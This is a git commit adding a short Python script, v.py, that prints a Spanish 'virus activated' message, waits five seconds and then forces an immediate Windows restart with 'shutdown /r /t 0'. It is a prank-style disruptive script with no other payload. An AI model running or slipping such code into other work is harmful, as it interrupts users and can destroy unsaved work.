209d1445009cb4dbd847387d492599cff2ba0525
lamber55 <48569060+lamber55@users.noreply.github.com>
2025-12-20 00:03:53 +0100

    Add files via upload

---
+++ v.py
@@ -0,0 +1,14 @@
+# -*- coding: utf-8 -*-
+"""
+Created on Fri Dec 19 22:50:12 2025
+
+@author: mique
+"""
+
+import os
+import time
+
+print("Virus activado... Reiniciando el sistema en 5 segundos...")
+time.sleep(5)
+
+os.system("shutdown /r /t 0")
